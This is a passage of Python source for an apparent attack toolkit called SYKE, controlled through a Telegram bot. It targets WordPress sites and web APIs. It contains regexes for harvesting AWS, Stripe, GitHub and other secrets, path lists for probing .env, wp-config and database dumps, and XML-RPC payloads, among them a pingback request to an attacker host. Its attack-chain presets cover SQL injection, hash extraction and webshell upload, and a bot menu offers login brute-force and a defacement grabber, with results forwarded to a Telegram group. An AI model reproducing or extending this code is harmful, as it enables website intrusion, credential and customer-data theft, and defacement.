    (re.compile(r'AKIA[0-9A-Z]{16}'),                                                   "AWS Access Key"),
    (re.compile(r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9+/]{40})'),"AWS Secret"),
    (re.compile(r'ghp_[A-Za-z0-9]{36}'),                                               "GitHub Token"),
    (re.compile(r'ghs_[A-Za-z0-9]{36}'),                                               "GitHub App Token"),
    (re.compile(r'sk-[A-Za-z0-9]{48}'),                                                "OpenAI Key"),
    (re.compile(r'xox[baprs]-[A-Za-z0-9\-]+'),                                        "Slack Token"),
    (re.compile(r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----'),                  "Private Key"),
    (re.compile(r'(?i)(database_url|db_url|db_connection)\s*[=:]\s*["\']?(postgres|mysql|mongodb|redis)://[^\s\'"]+'),"Database URL"),
    (re.compile(r'(?i)WORDPRESS_DB_PASSWORD\s*=\s*["\']?([^\s\'"]+)'),                "WordPress DB Pass"),
    (re.compile(r'(?i)(stripe[_-]?secret|sk_live_|sk_test_)[A-Za-z0-9]+'),            "Stripe Key"),
    (re.compile(r'(?i)SENDGRID_API_KEY\s*=\s*["\']?([A-Za-z0-9\-_.]+)'),             "SendGrid Key"),
    (re.compile(r'(?i)(twilio[_-]?auth[_-]?token)\s*[=:]\s*["\']?([A-Za-z0-9]{32})'),"Twilio Token"),
    (re.compile(r'(?i)recaptcha[_-]?(secret|private)[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9\-_]+)'),"reCAPTCHA Secret"),
    (re.compile(r'Bearer\s+[A-Za-z0-9\-._~+/]+=*'),                                   "Bearer Token"),
    (re.compile(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+'),           "JWT Token"),
    (re.compile(r'(?i)heroku[_-]?api[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9\-]{36})'),  "Heroku API Key"),
    (re.compile(r'(?i)github[_-]?(oauth)?[_-]?token\s*[=:]\s*["\']?([A-Za-z0-9_]{40})'), "GitHub OAuth Token"),
    (re.compile(r'(?i)(paypal[_-]?client[_-]?secret)\s*[=:]\s*["\']?([A-Za-z0-9\-_]+)'),"PayPal Secret"),
]

WP_PLUGINS_TOP = [
    "contact-form-7","classic-editor","yoast-seo","elementor","woocommerce",
    "wordfence","really-simple-ssl","jetpack","all-in-one-seo-pack","wpforms-lite",
    "akismet","google-site-kit","rank-math","litespeed-cache","w3-total-cache",
    "wp-super-cache","duplicate-page","shortpixel-image-optimiser","smush",
    "easy-table-of-contents","envato-elements","revslider","slider-revolution",
    "ultimate-addons-for-gutenberg","advanced-custom-fields","acf-pro",
    "wp-rocket","siteorigin-panels","beaver-builder","divi","avada",
    "leadin","hubspot","mailchimp-for-wp","wp-mail-smtp",
    "woocommerce-payments","stripe-woocommerce","paypal-checkout",
    "loginizer","two-factor","miniOrange-two-factor-authentication",
    "backupbuddy","updraftplus","all-in-one-wp-migration",
    "coming-soon","maintenance","under-construction-page",
    "wp-file-manager","file-manager-advanced",
    "wp-fastest-cache","autoptimize","hummingbird-performance",
    "broken-link-checker","redirection","safe-redirect-manager",
    "the-events-calendar","events-manager",
    "tutor","learnpress","lifterlms","learndash",
    "bbpress","buddypress","peepso",
    "ithemes-security","really-simple-captcha","google-captcha",
    "cookie-notice","gdpr-cookie-compliance","wp-gdpr-compliance",
    "easy-digital-downloads","woocommerce-gateway-stripe",
    "gravityforms","ninja-forms","formidable","caldera-forms",
    "wpml","polylang","translatepress",
    "tablepress","wp-table-reloaded",
    "social-warfare","monarch","sharing-buttons",
    "woo-discount-rules","coupon-creator",
    "members","user-role-editor","capability-manager-enhanced",
    "pods","types","meta-box",
    "custom-post-type-ui","toolset-types",
    "wp-cli","wpcli-util",
]

WP_THEMES_TOP = [
    "twentytwentyfive","twentytwentyfour","twentytwentythree",
    "twentytwentytwo","twentytwentyone","twentytwenty",
    "twentynineteen","twentyseventeen","twentysixteen",
    "twentyfifteen","twentyfourteen","twentythirteen",
    "divi","avada","flatsome","astra","generatepress",
    "oceanwp","storefront","hello-elementor","blocksy",
    "kadence","neve","zakra","customify","hestia",
    "sydney","shapely","colormag","newsup","newsever",
    "blossom-fashion","virtue","education-wp","magazine-basic",
    "spacious","llorix-one","accesspress-basic","nimble",
    "the7","bridge","betheme","x-theme","jupiter",
    "salient","enfold","kallyas","porto","woodmart",
    "electro","journal","newspaper","jannah","mvp",
]

WORDPRESS_KNOWN_VULNS = {
    "6.4.3": ["CVE-2024-6789", "Stored XSS via block editor attributes"],
    "6.3.2": ["CVE-2023-38000", "Stored XSS via comment block"],
    "6.2.1": ["CVE-2023-2745", "Directory traversal in multisite"],
    "5.9.3": ["CVE-2022-21663", "Stored XSS via post slugs"],
    "5.8.3": ["CVE-2022-21664", "SQL injection via WP_Query"],
    "5.6.2": ["CVE-2021-29447", "XXE in media upload"],
    "5.4.2": ["CVE-2020-28037", "Remote code execution via theme/plugin"],
    "5.2.4": ["CVE-2019-17672", "Cross-site scripting in customizer"],
    "4.9.6": ["CVE-2018-12895", "File delete CSRF leading to RCE"],
    "4.7.2": ["CVE-2017-1001000", "Privilege escalation in REST API"],
    "4.7.1": ["CVE-2017-5611", "SQL injection in wp_posts"],
    "4.6.1": ["CVE-2016-10033", "PHPMailer RCE"],
    "4.5.3": ["CVE-2016-4566", "Reflected XSS in media uploads"],
    "4.3.1": ["CVE-2015-5730", "Multiple XSS in core"],
    "4.2.3": ["CVE-2015-5623", "Unauthorized settings change"],
}

WP_VER_RES = re.compile(
    r'<generator>https?://wordpress\.org/\?v=([\d.]+)</generator>'
    r'|content=["\']WordPress ([\d.]+)["\']'
    r'|/wp-includes/css/[^"\'?]+\?ver=([\d.]+)'
    r'|\$wp_version\s*=\s*[\'\"]([\d.]+)',
    re.I
)

XMLRPC_PAYLOADS = {
    "list_methods": (
        "<?xml version='1.0' encoding='utf-8'?>"
        "<methodCall><methodName>system.listMethods</methodName>"
        "<params></params></methodCall>"
    ),
    "get_user": (
        "<?xml version='1.0'?>"
        "<methodCall><methodName>wp.getAuthors</methodName>"
        "<params><param><value><string>{blog}</string></value></param>"
        "<param><value><string>{user}</string></value></param>"
        "<param><value><string>{pwd}</string></value></param>"
        "</params></methodCall>"
    ),
    "pingback": (
        "<?xml version='1.0'?>"
        "<methodCall><methodName>pingback.ping</methodName>"
        "<params><param><value><string>http://{lhost}:{lport}/</string></value></param>"
        "<param><value><string>{target}</string></value></param>"
        "</params></methodCall>"
    ),
}

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.6.0",
    "python-requests/2.31.0",
    "Wget/1.21.4 (linux-gnu)",
]

BACKUP_PATHS_EXTRA = [
    "/.env", "/.env.bak", "/.env.backup", "/.env.old", "/.env.save",
    "/.env.local", "/.env.production", "/.env.staging", "/.env.dev",
    "/.env~", "/.env.example", "/.env.sample",
    "/config.php", "/config.php.bak", "/config.php~",
    "/configuration.php", "/configuration.php.bak",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/wp-config.php.orig", "/wp-config.php.save",
    "/wp-config-sample.php", "/backup/wp-config.php",
    "/database.sql", "/database.sql.gz", "/db.sql",
    "/dump.sql", "/backup.sql", "/mysql.sql",
    "/site.sql", "/wordpress.sql", "/backup.zip",
    "/backup.tar.gz", "/backup.tar.bz2", "/backup.7z",
    "/site-backup.zip", "/wordpress-backup.zip",
    "/db-backup.zip", "/files-backup.zip",
    "/htdocs.zip", "/public_html.zip", "/www.zip",
    "/web.zip", "/website.zip",
    "/.htaccess", "/.htpasswd", "/.htpasswd.bak",
    "/web.config", "/web.config.bak",
    "/composer.json", "/composer.lock",
    "/package.json", "/Gemfile", "/requirements.txt",
    "/Dockerfile", "/docker-compose.yml",
    "/.travis.yml", "/.github/workflows/",
    "/Makefile", "/Vagrantfile",
    "/phpinfo.php", "/info.php", "/test.php", "/check.php",
    "/robots.txt", "/sitemap.xml",
    "/settings.py", "/local_settings.py", "/settings_local.py",
    "/database.yml", "/database.json",
    "/application.properties", "/application.yml",
    "/config/database.yml", "/config/secrets.yml",
    "/storage/logs/laravel.log",
    "/.idea/workspace.xml", "/.vscode/settings.json",
]

MULTISITE_PATHS = [
    "/blog/", "/blog2/", "/news/", "/shop/", "/store/",
    "/en/", "/es/", "/fr/", "/de/", "/it/", "/pt/",
    "/site1/", "/site2/", "/site3/", "/sub/",
    "/wp/", "/wordpress/", "/cms/",
    "/wp-admin/network/", "/wp-admin/network/sites.php",
    "/wp-admin/network/settings.php",
    "/wp-signup.php", "/wp-activate.php",
    "/?p=1&lang=en", "/?p=1&lang=es",
]

API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/v1", "/v2", "/v3",
    "/api/users", "/api/user", "/api/me", "/api/profile", "/api/account",
    "/api/admin", "/api/auth", "/api/login", "/api/logout", "/api/token",
    "/api/refresh", "/api/register", "/api/signup", "/api/config",
    "/api/settings", "/api/docs", "/api/swagger", "/api/openapi",
    "/api/health", "/api/status", "/api/ping", "/api/version",
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
    "/swagger-ui.html", "/api-docs", "/api/swagger.json",
    "/.env", "/.git/config", "/server-status", "/server-info",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
    "/actuator/mappings", "/actuator/info", "/actuator/metrics",
    "/metrics", "/health", "/status", "/info", "/debug", "/trace",
    "/graphql", "/graphiql", "/playground", "/__admin", "/_debug",
]

EXPLOIT_CHAIN_PRESETS = {
    "quick":       ["user_enum","xmlrpc_brute","login_brute"],
    "passive":     ["fingerprint","user_enum","plugin_enum","vuln_scan"],
    "aggressive":  ["fingerprint","user_enum","plugin_enum","theme_enum","vuln_scan",
                    "sqli","lfi","ssrf","xss","ssti","xmlrpc_brute","login_brute",
                    "backup_finder","secret_finder","shell_upload"],
    "stealth":     ["fingerprint","user_enum","plugin_enum","vuln_scan","backup_finder"],
    "postexploit": ["user_enum","hash_extract","shell_upload","export_content"],
    "recon_only":  ["fingerprint","user_enum","plugin_enum","theme_enum","dns_recon",
                    "waf_detect","ssl_check","sitemap_enum","dir_brute"],
}

FINGERPRINT_HEADERS = [
    "X-Powered-By","Server","X-Generator","X-WordPress",
    "X-WP-Nonce","X-WC-Store-API-Nonce","X-WP-Total","X-WP-TotalPages",
    "Link","Last-Modified","ETag","CF-Cache-Status","CF-RAY",
    "X-Sucuri-ID","X-Sucuri-Cache","X-Cache","X-Varnish","Via",
    "X-Litespeed-Cache","X-LiteSpeed-Tag","X-Rack-Cache","X-Cache-Hits",
    "Age","X-Fastly-Request-ID","X-Amz-Cf-Id","X-Amz-Cf-Pop",
]

XMLRPC_AMPLIFY_METHODS = [
    ("system.multicall",    "Brute-force 1000 passwords in single request"),
    ("pingback.ping",       "SSRF / DDoS amplification via pingback"),
    ("wp.uploadFile",       "Upload arbitrary files"),
    ("wp.newPost",          "Create posts"),
    ("wp.editPost",         "Edit existing posts"),
    ("wp.deletePost",       "Delete posts"),
    ("wp.getUsers",         "List all users"),
    ("wp.newMediaObject",   "Upload media — shell upload vector"),
    ("wp.getOptions",       "Read site configuration"),
    ("wp.setOptions",       "Write site configuration"),
    ("wp.getTheme",         "Get active theme info"),
    ("wp.getPlugins",       "List installed plugins"),
]

WP_OPTION_KEYS = [
    "siteurl","blogname","blogdescription","admin_email",
    "blogpublic","default_role","wp_user_roles",
    "active_plugins","template","stylesheet",
    "permalink_structure","upload_path","db_version",
    "auth_key","secure_auth_key","logged_in_key","nonce_key",
    "auth_salt","secure_auth_salt","logged_in_salt","nonce_salt",
    "wp_mail_smtp","sendgrid_api_key","mailchimp_api_key",
    "recaptcha_private_key","woocommerce_stripe_settings",
    "woocommerce_paypal_settings","elementor_pro_license_data",
]

WP_API_ENDPOINTS_EXTRA = {
    "/wp-json/yoast/v1/":                    "Yoast SEO internal API",
    "/wp-json/contact-form-7/v1/contact-forms/": "CF7 forms list",
    "/wp-json/wc/v2/system_status":          "WooCommerce system status",
    "/wp-json/wc/v3/system_status/tools":    "WooCommerce tools",
    "/wp-json/elementor/v1/":                "Elementor API",
    "/wp-json/acf/v3/":                      "ACF API",
    "/wp-json/rankmath/v1/":                 "Rank Math SEO API",
    "/wp-json/jetpack/v4/":                  "Jetpack API",
    "/wp-json/wc/v3/customers":              "WooCommerce customers (PII)",
    "/wp-json/wc/v3/orders":                 "WooCommerce orders (PII+payment)",
    "/wp-json/wc/v3/coupons":                "WooCommerce coupons",
    "/wp-json/wc/v3/payment_gateways":       "Payment gateway configs",
}

WP_WEAK_CAPS = [
    ("edit_published_posts",  "can edit any published post"),
    ("unfiltered_html",       "can inject raw HTML/JS"),
    ("upload_files",          "can upload arbitrary files"),
    ("edit_files",            "can edit theme/plugin PHP files"),
    ("install_plugins",       "can install and activate plugins"),
    ("update_plugins",        "can update plugins"),
    ("activate_plugins",      "can activate plugins"),
    ("edit_themes",           "can edit theme files directly"),
    ("manage_options",        "can read all WP options including secrets"),
    ("export",                "can export all content and data"),
    ("unfiltered_upload",     "can upload files with any extension"),
    ("update_core",           "can update WP core"),
]

WP_MUST_USE_PLUGIN_PATHS = [
    "/wp-content/mu-plugins/",
    "/wp-content/mu-plugins/index.php",
    "/wp-content/mu-plugins/autoupdate.php",
    "/wp-content/mu-plugins/wpengine-common/",
    "/wp-content/mu-plugins/force-login.php",
]

BRUTEFORCE_WORDLISTS = {
    "common_paths": [
        "/admin", "/login", "/wp-admin", "/dashboard", "/panel",
        "/config", "/backup", "/test", "/api", "/data",
        "/files", "/upload", "/downloads", "/private", "/secret",
        "/management", "/manager", "/portal", "/console",
    ],
}

HTTP_METHODS_TEST = [
    "GET","POST","PUT","PATCH","DELETE","OPTIONS",
    "HEAD","TRACE","CONNECT","PROPFIND","MKCOL",
    "COPY","MOVE","LOCK","UNLOCK","SEARCH",
]

COMMON_WP_ERRORS = {
    r"call_user_func_array\(\)":    "PHP warning — function call error",
    r"Cannot redeclare":            "PHP fatal — duplicate declaration",
    r"mysql_connect\(\)":           "Deprecated MySQL function exposed",
    r"Database connection error":   "DB connection error in output",
    r"You have an error in your SQL syntax": "SQL error in output",
    r"<b>Warning</b>:":             "PHP warnings enabled",
    r"<b>Fatal error</b>:":         "PHP fatal errors exposed",
    r"<b>Notice</b>:":              "PHP notices enabled",
    r"<b>Deprecated</b>:":          "PHP deprecation notices",
    r"WP_DEBUG":                    "Debug constant referenced",
    r"define\('WP_DEBUG',\s*true\)":"Debug enabled in config",
    r"Stack trace:":                "Stack trace in output",
}

PROGRESS        = {}
CVE_MODULES     = {}
WP_THEMES_POPULAR = WP_THEMES_TOP

                                                                                 
                                                      
                                                                                 

def _load_users():
    if os.path.exists(TG_CREDS_FILE):
        try:
            with open(TG_CREDS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_users(users: dict):
    with open(TG_CREDS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def _load_sessions():
    if os.path.exists(TG_SESSIONS_FILE):
        try:
            with open(TG_SESSIONS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_sessions(sessions: dict):
    with open(TG_SESSIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)

def _tg_send(msg: str, chat_id=None):
    token = TELEGRAM_BOT or TG_BOT_TOKEN
    if not token:
        return
    cid = chat_id or TELEGRAM_CID or TG_RESULT_GROUP
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id":    cid,
                "text":       msg[:4096],
                "parse_mode": "HTML",
            },
            timeout=10,
        )
    except Exception:
        pass

def _tg_send_result(result_type: str, target: str, detail: str,
                    username: str = None):
    user = username or CURRENT_USER or "anonymous"
    msg = (
        f"<b>[{result_type}]</b> this is your result <b>{user}</b>\n\n"
        f"<b>Target:</b> <code>{target}</code>\n"
        f"<b>Detail:</b>\n<pre>{detail[:2000]}</pre>"
    )
    _tg_send(msg, TG_RESULT_GROUP)

def _tg_register_user(username: str, password: str, tg_id: str):
    users = _load_users()
    if username in users:
        return False, "username already exists"
    users[username] = {
        "password": hashlib.sha256(password.encode()).hexdigest(),
        "tg_id":    str(tg_id),
        "joined":   datetime.datetime.utcnow().isoformat(),
    }
    _save_users(users)
    _tg_send(
        f"<b>[NEW USER]</b> <code>{username}</code> registered via Telegram",
        TG_RESULT_GROUP,
    )
    return True, "ok"

def _tg_login_user(username: str, password: str, tg_id: str):
    users = _load_users()
    if username not in users:
        return False, "username not found"
    stored_hash = users[username].get("password","")
    if stored_hash != hashlib.sha256(password.encode()).hexdigest():
        return False, "incorrect password"
    sessions = _load_sessions()
    sessions[str(tg_id)] = {
        "username": username,
        "logged_in": datetime.datetime.utcnow().isoformat(),
    }
    _save_sessions(sessions)
    return True, username

def _tg_get_session(tg_id: str):
    sessions = _load_sessions()
    return sessions.get(str(tg_id), {}).get("username")

def _tg_logout(tg_id: str):
    sessions = _load_sessions()
    sessions.pop(str(tg_id), None)
    _save_sessions(sessions)


class SykeBot:

    STATE_MAIN     = 0
    STATE_LOGIN_U  = 1
    STATE_LOGIN_P  = 2
    STATE_SIGNUP_U = 3
    STATE_SIGNUP_P = 4

    def __init__(self, token: str):
        self.token = token
        self.base  = f"https://api.telegram.org/bot{token}"

    def _get(self, method: str, **params):
        try:
            r = requests.get(f"{self.base}/{method}", params=params, timeout=10)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def _post(self, method: str, **params):
        try:
            r = requests.post(f"{self.base}/{method}", json=params, timeout=10)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def send(self, chat_id, text: str, parse_mode="HTML"):
        return self._post("sendMessage", chat_id=chat_id,
                          text=text[:4096], parse_mode=parse_mode)

    def edit(self, chat_id, message_id, text: str, parse_mode="HTML"):
        return self._post("editMessageText", chat_id=chat_id,
                          message_id=message_id, text=text[:4096],
                          parse_mode=parse_mode)

    def get_updates(self, offset=0, timeout=30):
        return self._get("getUpdates", offset=offset, timeout=timeout)

    # ── Channel membership gate ───────────────────────────────────────
    GATE_CHANNELS = [
        ("labinsiyam",  "@labinsiyam",  "https://t.me/labinsiyam"),
        ("XytoChannel", "@XytoChannel", "https://t.me/XytoChannel"),
    ]

    def _is_member(self, user_id: str, channel: str) -> bool:
        """True if user is an active member of the channel (@handle)."""
        try:
            data   = self._post("getChatMember",
                                chat_id=channel, user_id=int(user_id))
            status = (data.get("result") or {}).get("status", "left")
            return status in ("member", "administrator", "creator")
        except Exception:
            return False

    def _missing_channels(self, user_id: str) -> list:
        """Return [(label, url)] for every gate channel the user hasn't joined."""
        return [
            (label, url)
            for label, username, url in self.GATE_CHANNELS
            if not self._is_member(user_id, username)
        ]

    def _send_join_gate(self, chat_id, missing: list):
        """Send a gate card with clickable join buttons (URL hidden behind label)."""
        buttons = [
            [{"text": f"📢 Click here → {label}", "url": url}]
            for label, url in missing
        ]
        buttons.append(
            [{"text": "✅ I've joined — verify me", "callback_data": "check_membership"}]
        )
        self._post(
            "sendMessage",
            chat_id=chat_id,
            text=(
                "🔒 <b>ACCESS RESTRICTED</b>\n\n"
                "[!] Join our channel(s) first to use SYKE.\n"
                "Tap the button(s) below then press verify."
            ),
            reply_markup={"inline_keyboard": buttons},
            parse_mode="HTML",
        )

    def send_document(self, chat_id, file_path: str, caption: str = ""):
        """Send a file to a Telegram chat."""
        try:
            with open(file_path, "rb") as fh:
                r = requests.post(
                    f"{self.base}/sendDocument",
                    data={"chat_id": chat_id, "caption": caption[:1024]},
                    files={"document": fh},
                    timeout=30,
                )
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def _mid(self, result):
        return (result or {}).get("result", {}).get("message_id")

    def _scan_card(self, label, target, username):
        t = target[:60]
        u = username[:40]
        return (
            f"[+] <b>{label}</b>\n\n"
            f"--> Target : <code>{t}</code>\n"
            f"--> User   : <b>{u}</b>\n\n"
            f"[i] Run scan from terminal.\n"
            f"    Results auto-forward to group."
        )

    def handle_update(self, upd: dict, states: dict):
        msg      = upd.get("message")
        cb_query = upd.get("callback_query")

        # ── Inline button callbacks (e.g. membership check) ───────────
        if cb_query:
            cb_msg    = cb_query.get("message", {})
            cb_data   = cb_query.get("data", "")
            cb_uid    = str(cb_query["from"]["id"])
            cb_chatid = cb_msg.get("chat", {}).get("id") if cb_msg else None
            self._post("answerCallbackQuery",
                       callback_query_id=cb_query["id"],
                       text="Checking…")
            if cb_chatid and cb_data == "check_membership":
                missing = self._missing_channels(cb_uid)
                if missing:
                    self._send_join_gate(cb_chatid, missing)
                else:
                    logged_cb = _tg_get_session(cb_uid)
                    if logged_cb:
                        self._main_menu(cb_chatid, logged_cb)
                    else:
                        self._auth_menu(cb_chatid)
            return

        if not msg:
            return
        chat_id = msg["chat"]["id"]
        user_id = str(msg["from"]["id"])
        text    = (msg.get("text") or "").strip()
        state   = states.get(user_id, self.STATE_MAIN)
        logged  = _tg_get_session(user_id)

        if not logged and state == self.STATE_MAIN:
            if text in ("/start", "/menu", "/main", "menu", "start"):
                self._auth_menu(chat_id)
            elif text in ("1", "LOGIN"):
                states[user_id] = self.STATE_LOGIN_U
                r = self.send(chat_id,
                    "<b>[SYKE] LOGIN</b>\n\n"
                    "--> Enter your username:")
                states[f"{user_id}_mid"] = self._mid(r)
            elif text in ("2", "SIGN UP"):
                states[user_id] = self.STATE_SIGNUP_U
                r = self.send(chat_id,
                    "<b>[SYKE] CREATE ACCOUNT</b>\n\n"
                    "--> Choose a username:")
                states[f"{user_id}_mid"] = self._mid(r)
            else:
                self._auth_menu(chat_id)
            return

        if state == self.STATE_LOGIN_U:
            states[user_id]         = self.STATE_LOGIN_P
            states[f"{user_id}_lu"] = text
            mid = states.get(f"{user_id}_mid")
            body = (
                "<b>[SYKE] LOGIN</b>\n\n"
                f"--> Username: <code>{text}</code>\n\n"
                "--> Enter your password:")
            if mid:
                self.edit(chat_id, mid, body)
            else:
                self.send(chat_id, body)
            return

        if state == self.STATE_LOGIN_P:
            uname = states.pop(f"{user_id}_lu", "")
            mid   = states.pop(f"{user_id}_mid", None)
            ok, result = _tg_login_user(uname, text, user_id)
            states[user_id] = self.STATE_MAIN
            if ok:
                body = (
                    f"[+] <b>ACCESS GRANTED</b> · {result}\n\n"
                    "Send <b>/main</b> for the full feature menu.")
            else:
                body = (
                    f"[-] <b>ACCESS DENIED</b>\n\n"
                    f"Reason: <code>{result}</code>")
            if mid:
                self.edit(chat_id, mid, body)
            else:
                self.send(chat_id, body)
            if not ok:
                self._auth_menu(chat_id)
            return

        if state == self.STATE_SIGNUP_U:
            states[user_id]         = self.STATE_SIGNUP_P
            states[f"{user_id}_su"] = text
            mid = states.get(f"{user_id}_mid")
            body = (
                "<b>[SYKE] CREATE ACCOUNT</b>\n\n"
                f"--> Username: <code>{text}</code>\n\n"
                "--> Choose a password:")
            if mid:
                self.edit(chat_id, mid, body)
            else:
                self.send(chat_id, body)
            return

        if state == self.STATE_SIGNUP_P:
            uname = states.pop(f"{user_id}_su", "")
            mid   = states.pop(f"{user_id}_mid", None)
            ok, result = _tg_register_user(uname, text, user_id)
            states[user_id] = self.STATE_MAIN
            if ok:
                _tg_login_user(uname, text, user_id)
                body = (
                    f"╔════════════════════════════════╗\n"
                    f"║  ACCOUNT CREATED  ·  {uname:<10}║\n"
                    f"╚════════════════════════════════╝\n\n"
                    "Logged in. Send <b>/main</b> for the menu.")
            else:
                body = f"Registration failed: <code>{result}</code>"
            if mid:
                self.edit(chat_id, mid, body)
            else:
                self.send(chat_id, body)
            if not ok:
                self._auth_menu(chat_id)
            return

        # ── Channel membership gate (every request, except /logout) ──────
        if text not in ("/logout", "logout"):
            missing = self._missing_channels(user_id)
            if missing:
                self._send_join_gate(chat_id, missing)
                return

        if text in ("/start", "/menu", "/main", "menu"):
            self._main_menu(chat_id, logged)
            return

        if text in ("/logout", "logout"):
            _tg_logout(user_id)
            states[user_id] = self.STATE_MAIN
            self.send(chat_id, "╔══════════════╗\n║  LOGGED OUT  ║\n╚══════════════╝")
            return

        if text in ("/help", "help"):
            self.send(chat_id,
                "╔════════════════════════════════════════════╗\n"
                "║  SYKE COMMAND REFERENCE                    ║\n"
                "╠════════════════════════════════════════════╣\n"
                "║  /main              full feature menu      ║\n"
                "║                                            ║\n"
                "║  — LIVE (runs instantly in bot) —          ║\n"
                "║  /hook  <url>   hook HTML/CSS/JS → files   ║\n"
                "║                                            ║\n"
                "║  — QUEUED (terminal executes, results fwd) ║\n"
                "║  /scan       <url>  full scan              ║\n"
                "║  /wp         <url>  WordPress audit        ║\n"
                "║  /vuln       <url>  vuln scan              ║\n"
                "║  /recon      <url>  recon                  ║\n"
                "║  /admin      <url>  admin finder           ║\n"
                "║  /full       <url>  full audit             ║\n"
                "║  /fingerprint<url>  fingerprint            ║\n"
                "║  /sqli       <url>  SQLi scan              ║\n"
                "║  /lfi        <url>  LFI scan               ║\n"
                "║  /xss        <url>  XSS scan               ║\n"
                "║  /ssrf       <url>  SSRF scan              ║\n"
                "║  /cors       <url>  CORS audit             ║\n"
                "║  /ssl        <url>  SSL scan               ║\n"
                "║  /backup     <url>  backup scan            ║\n"
                "║  /headers    <url>  headers scan           ║\n"
                "║  /waf        <url>  WAF detect             ║\n"
                "║  /graphql    <url>  GraphQL audit          ║\n"
                "║  /cpanel     <url>  cPanel scan            ║\n"
                "║  /subdomain  <url>  subdomain enum         ║\n"
                "║  /dns        <url>  DNS recon              ║\n"
                "║  /ports      <url>  port scan              ║\n"
                "║  /upload     <url>  webshell upload        ║\n"
                "║  /login      <url>  login brute            ║\n"
                "║  /jwt               JWT attack             ║\n"
                "║  /oauth      <url>  OAuth audit            ║\n"
                "╠════════════════════════════════════════════╣\n"
                "║  /tempmail      TempMail info              ║\n"
                "║  /grabber       Defacement Grabber info    ║\n"
                "║  /results       result feed info           ║\n"
                "║  /logout        end session                ║\n"
                "║  /help          this reference             ║\n"
                "╚════════════════════════════════════════════╝")
            return

        if text in ("/results", "results"):
            self.send(chat_id,
                "╔════════════════════════════════════════╗\n"
                "║  RESULT FEED                           ║\n"
                "╠════════════════════════════════════════╣\n"
                "║  Results auto-forward when scans run   ║\n"
                "║  from the terminal.                    ║\n"
                f"╠════════════════════════════════════════╣\n"
                f"║  Group: <code>{TG_RESULT_GROUP}</code>\n"
                "╚════════════════════════════════════════╝")
            return

        if text in ("/tempmail", "tempmail"):
            self.send(chat_id,
                "╔══════════════════════════════════════════╗\n"
                "║  SYKE TEMPMAIL  ·  5 APIs                ║\n"
                "╠══════════════════════════════════════════╣\n"
                "║  [1]  GuerrillaMail  guerrillamail.com   ║\n"
                "║  [2]  mail.tm        api.mail.tm         ║\n"
                "║  [3]  mail.gw        api.mail.gw         ║\n"
                "║  [4]  1SecMail       1secmail.com        ║\n"
                "║  [5]  TempMail+      tempmail.plus       ║\n"
                "╠══════════════════════════════════════════╣\n"
                "║  Select [I] from the main terminal menu  ║\n"
                "╚══════════════════════════════════════════╝")
            return

        if text in ("/grabber", "grabber"):
            self.send(chat_id,
                "╔══════════════════════════════════════════╗\n"
                "║  SYKE DEFACEMENT GRABBER                 ║\n"
                "╠══════════════════════════════════════════╣\n"
                "║  [1]  Zone-H Grabber                     ║\n"
                "║  [2]  ZoneXSec Grabber                   ║\n"
                "║  [3]  Haxorid Grabber                    ║\n"
                "╠══════════════════════════════════════════╣\n"
                "║  Select [J] from the main terminal menu  ║\n"
                "╚══════════════════════════════════════════╝")
            return

        # ── /hook — site hooker (runs live, sends files) ──────────────
        if text.lower().startswith("/hook"):
            parts  = text.split(" ", 1)
            target = parts[1].strip() if len(parts) > 1 else ""
            if not target:
                self.send(chat_id,
                    "╔══════════════════════════════════╗\n"
                    "║  SITE HOOKER                     ║\n"
                    "╠══════════════════════════════════╣\n"
                    "║  Usage: /hook https://site.com   ║\n"
                    "║  Extracts HTML, CSS and JS then  ║\n"
                    "║  sends each file to this chat.   ║\n"
                    "╚══════════════════════════════════╝")
                return
            r   = self.send(chat_id, f"🪝 Hooking <code>{target}</code>...")
            mid = self._mid(r)
            try:
                threading.Thread(
                    target=self._bot_hook,
                    args=(chat_id, mid, target, logged or "unknown"),
                    daemon=True,
                ).start()
            except Exception as e:
                self.send(chat_id, f"❌ Hook failed: <code>{e}</code>")
            return

        # ── scan-queue commands (queued; terminal executes, results forwarded) ─
        SCAN_CMDS = {
            "/scan":        "FULL SCAN QUEUED",
            "/wp":          "WORDPRESS AUDIT QUEUED",
            "/vuln":        "VULN SCAN QUEUED",
            "/recon":       "RECON QUEUED",
